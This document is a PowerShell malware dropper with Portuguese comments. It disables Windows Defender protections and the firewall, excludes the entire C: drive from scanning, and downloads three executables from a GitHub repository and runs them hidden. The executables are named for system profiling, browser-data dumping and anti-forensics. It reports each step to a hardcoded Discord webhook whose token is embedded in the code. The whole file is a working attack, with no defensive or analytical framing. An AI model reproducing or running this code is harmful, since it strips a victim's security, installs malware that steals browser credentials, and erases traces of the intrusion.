# mandante.ps1 - VERSÃO DEFINITIVA (com curl)
# Execute como Administrador (já estará elevado)

$TempFolder = $env:TEMP

function Send-DiscordWebhook {
    param([string]$Message)
    $webhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
    $escaped = $Message -replace '"', '\"' -replace "`n", '\n' -replace "`r", '\r'
    $json = "{`"content`":`"$escaped`"}"
    try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null } catch {}
}

# Desativa Defender
Send-DiscordWebhook "🛡️ Desativando bloqueio à primeira vista (1/7)"
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando IOAV (2/7)"
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando escaneamento de scripts (3/7)"
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando envio de amostras (4/7)"
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando MAPS (5/7)"
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
Send-DiscordWebhook "🔥 Desligando Firewall (6/7)"
netsh advfirewall set allprofiles state off
Send-DiscordWebhook "📅 Adicionando exclusão do C:\ (7/7)"
$drive = [char]67 + ':\'
Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue

# ==================================================
# BAIXA OS EXECUTÁVEIS COM CURL (MAIS CONFIÁVEL)
# ==================================================
function Download-File {
    param($url, $path)
    try {
        curl -L -o $path $url
        if (Test-Path $path) {
            Write-Host "Baixado com sucesso: $path"
            return $true
        } else {
            Write-Host "Falha: arquivo não foi criado."
            return $false
        }
    } catch {
        Write-Host "ERRO no curl: $_"
        return $false
    }
}

Send-DiscordWebhook "🖥️ Baixando sysinfo.exe..."
if (Download-File "https://github.com/gsfv/tro.j/raw/refs/heads/main/sysinfo.exe" "$TempFolder\sysinfo.exe") {
    Send-DiscordWebhook "🖥️ Executando sysinfo.exe..."
    Start-Process -FilePath "$TempFolder\sysinfo.exe" -Wait -WindowStyle Hidden
} else {
    Send-DiscordWebhook "❌ Falha no sysinfo.exe"
}

Send-DiscordWebhook "🌐 Baixando dumpbrowserdata.exe..."
if (Download-File "https://github.com/gsfv/tro.j/raw/refs/heads/main/dumpbrowserdata.exe" "$TempFolder\dumpbrowserdata.exe") {
    Send-DiscordWebhook "🌐 Executando dumpbrowserdata.exe..."
    Start-Process -FilePath "$TempFolder\dumpbrowserdata.exe" -Wait -WindowStyle Hidden
} else {
    Send-DiscordWebhook "❌ Falha no dumpbrowserdata.exe"
}

Send-DiscordWebhook "🧹 Baixando antiforensics.exe..."
if (Download-File "https://github.com/gsfv/tro.j/raw/refs/heads/main/antiforensics.exe" "$TempFolder\antiforensics.exe") {
    Send-DiscordWebhook "🧹 Executando antiforensics.exe..."
    Start-Process -FilePath "$TempFolder\antiforensics.exe" -Wait -WindowStyle Hidden
} else {
    Send-DiscordWebhook "❌ Falha no antiforensics.exe"
}

Send-DiscordWebhook "✅ Processo concluído!"
exit
